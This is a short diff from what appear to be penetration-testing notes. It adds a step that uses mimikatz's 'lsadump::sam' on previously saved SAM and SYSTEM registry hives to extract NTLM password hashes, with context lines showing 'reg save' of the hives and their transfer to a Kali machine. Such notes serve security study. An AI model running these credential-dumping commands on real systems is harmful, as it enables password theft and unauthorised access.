@@ -30,7 +30,21 @@ and
 reg save hklm\system C:\temp\system.hive
 ```
 
-3. Transfer files to kali machine
+3. Get hashs
+
+_**Windows**_
+
+Use mimikatz to get NLTM hashs:
+
+{% code overflow="wrap" %}
+```powershell
+.\mimikatz.exe "lsadump::sam /system:c:\temp\system /sam:c:\temp\sam" "exit"
+```
+{% endcode %}
+
+_**Kali**_
+
+Transfer files to kali machine
 
 **Enable drive direction on RDP session:**
 
